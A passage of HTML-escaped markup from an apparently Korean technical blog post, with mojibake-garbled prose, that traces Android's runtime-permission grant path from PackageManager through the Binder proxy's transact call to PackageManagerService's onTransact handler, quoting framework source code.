    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;numPermissions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;Permission&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;permission&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mPermissions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;valueAt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;permission&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isSystemFixed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;permission&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isGranted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;mPackageManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;grantRuntimePermission&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mPackageInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;packageName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;permission&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mUserHandle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isCurrentlyGranted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;checkPermission&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;permission&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;PERMISSION_GRANTED&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isCurrentlyGranted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;mPackageManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;revokeRuntimePermission&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mPackageInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;packageName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
                            &lt;span class=&quot;n&quot;&gt;permission&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mUserHandle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
				&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ì˜ í•¨ìˆ˜ì—ì„œëŠ” PackageManagerë¥¼ ì‚¬ìš©í•´ Runtime Permissionì„ ë³€ê²½í•©ë‹ˆë‹¤. PackageManagerëŠ”  &lt;code class=&quot;highlighter-rouge&quot;&gt;ApplicationPackageManager&lt;/code&gt; í´ë˜ìŠ¤ì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;grantRuntimePermission&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packageName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;permissionName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;UserHandle&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;mPM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;grantRuntimePermission&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packageName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;permissionName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getIdentifier&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;RemoteException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;rethrowFromSystemServer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;grantRuntimePermission&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packageName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;permissionName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;userId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;android&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;RemoteException&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;android&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Parcel&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;android&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Parcel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;obtain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;android&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Parcel&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_reply&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;android&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Parcel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;obtain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;_data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;writeInterfaceToken&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;DESCRIPTOR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;_data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;writeString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packageName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;_data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;writeString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;permissionName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;_data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;writeInt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;userId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mRemote&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;transact&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Stub&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;TRANSACTION_grantRuntimePermission&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_reply&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getDefaultImpl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;getDefaultImpl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;grantRuntimePermission&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packageName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;permissionName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;userId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;_reply&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;finally&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;_reply&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;recycle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;_data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;recycle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ì˜ ì½”ë“œì—ì„œ ë³¼ ìˆ˜ ìˆë“¯, ì¸ìë¡œ ë°›ì€ ê°’ë“¤ì„ ëª¨ë‘ ì§ë ¬í™”í•œ ì´í›„ transactë¥¼ ì§„í–‰í•˜ê²Œ ë©ë‹ˆë‹¤. ì´ë•Œ IPCí†µì‹ ìœ¼ë¡œ ì¸ìë¥¼ ì „ë‹¬ í›„, ê²°ê³¼ë¥¼ ë°›ì•„ ì´ìƒì´ ì—†ì„ ê²½ìš° ì •ìƒì ìœ¼ë¡œ ë°˜í™˜ë˜ê²Œ ë©ë‹ˆë‹¤.  transactì— ì‚¬ìš©ë˜ëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;mRemoteëŠ” Service Binder&lt;/code&gt;ì…ë‹ˆë‹¤. í•´ë‹¹ Binderë¥¼ í†µí•´ transactë¥¼ í•˜ê²Œ ë˜ë©´ onTransactí•¨ìˆ˜ê°€ í˜¸ì¶œë˜ë©°, ì•„ë˜ì˜ í•¨ìˆ˜ì—ì„œ ì²˜ë¦¬í•˜ê²Œ ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// (PackageManagerService extends IPackageManager.Stub).onTransact&lt;/span&gt;
&lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onTransact&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Parcel&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Parcel&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reply&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;RemoteException&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;super&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;onTransact&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reply&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;RuntimeException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SecurityException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IllegalArgumentException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nc&quot;&gt;Slog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;wtf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;TAG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Package Manager Crash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// IPackageManager.Stub.onTransact&lt;/span&gt;
&lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onTransact&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;android&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Parcel&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;android&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Parcel&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reply&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;android&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;RemoteException&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;descriptor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;DESCRIPTOR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;TRANSACTION_grantRuntimePermission:&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;enforceInterface&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;descriptor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_arg0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;_arg0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
